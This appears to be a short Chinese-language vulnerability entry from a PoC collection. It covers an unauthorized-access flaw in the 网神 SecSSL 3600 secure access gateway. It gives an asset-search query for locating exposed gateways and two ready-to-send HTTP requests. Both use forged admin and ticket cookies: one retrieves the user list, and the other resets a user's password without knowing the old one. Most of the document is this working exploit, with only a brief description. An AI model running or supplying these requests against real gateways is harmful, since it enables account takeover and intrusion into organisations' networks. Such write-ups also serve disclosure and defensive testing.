# 网神 SecSSL 3600安全接入网关系统 未授权访问漏洞

## 漏洞描述

网神 SecSSL 3600安全接入网关系统 存在未授权访问漏洞，攻击者通过漏洞可以获取用户列表，并修改用户账号密码

## 漏洞影响

<a-checkbox checked>网神 SecSSL 3600安全接入网关系统  </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="安全接入网关SecSSLVPN" </a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1683194562640-b489ef43-07a3-45a1-8bd9-c7b311c1c0c0.png)

验证POC，获取用户列表zkec

```sql
GET /admin/group/x_group.php?id=2

Cookie: admin_id=1; gw_admin_ticket=1;
```

![img](../../../.vuepress/public/img/1683194650093-f31de8b5-b20e-46c4-b967-dc2d5007f861.png)

修改用户密码

```sql
POST /changepass.php?type=2 

Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"ceshi","subAuthId":"1"}
old_pass=&password=Asd123!@#123A&repassword=Asd123!@#123A
```

![img](../../../.vuepress/public/img/1683194784648-9c5a03d8-e44c-406e-94f8-15bb299bc2a4.png)